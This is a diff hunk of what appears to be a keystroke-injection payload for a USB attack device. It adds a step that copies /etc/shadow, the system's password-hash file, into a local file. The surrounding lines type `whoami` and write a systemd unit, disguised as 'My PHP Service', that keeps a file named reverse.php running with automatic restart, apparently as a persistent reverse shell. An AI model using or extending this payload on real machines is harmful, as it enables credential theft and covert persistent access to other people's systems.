@@ -42,6 +42,9 @@ ENTER
 DELAY 500
 STRING whoami
 ENTER
+DELAY 500
+STRING cat /etc/shadow >> shadow.txt
+ENTER
 DELAY 1000
 STRING echo -e "[Unit]\nDescription=My PHP Service\n\n[Service]\nExecStart=/usr/bin/php /home/sergio/.outlock/reverse.php\nRestart=always\nRestartSec=10\n\n[Install]\nWantedBy=multi-user.target" > outlock.service
 ENTER
